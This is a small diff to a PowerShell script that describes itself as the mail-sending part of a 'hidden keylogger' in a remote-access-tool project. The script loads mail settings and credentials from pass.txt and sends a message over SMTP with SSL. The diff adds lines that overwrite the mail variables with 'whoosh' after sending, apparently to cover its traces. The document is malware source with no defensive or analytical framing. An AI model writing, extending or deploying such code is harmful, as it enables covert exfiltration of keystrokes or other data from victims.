@@ -3,6 +3,7 @@
 # It will show a window if it runs standalone. However, when you start it from
 # the hidden keylogger it will run ~perfectly~
 # Coded by @J-P-S-O (https://github.com/J-P-S-O/jsrat)
+
 $file_data = Get-Content pass.txt
 $EmailFrom = $file_data[2]
 $EmailTo = $file_data[2]
@@ -15,6 +16,15 @@ $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, $file_data[4])
 $SMTPClient.EnableSsl = $true
 $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($mailusername, $mailpassword);
 $SMTPClient.Send($EmailFrom, $EmailTo, $Subject, $Body)
+
+# Remove all the data
+
 $file_data = "whoosh"
 $mailusername = "whoosh"
 $mailpassword = "whoosh"
+$EmailFrom = "whoosh"
+$EmailTo = "whoosh"
+$Body = "whoosh"
+$Subject = "whoosh"
+$SMTPServer = "whoosh"
+$SMTPClient = "whoosh"
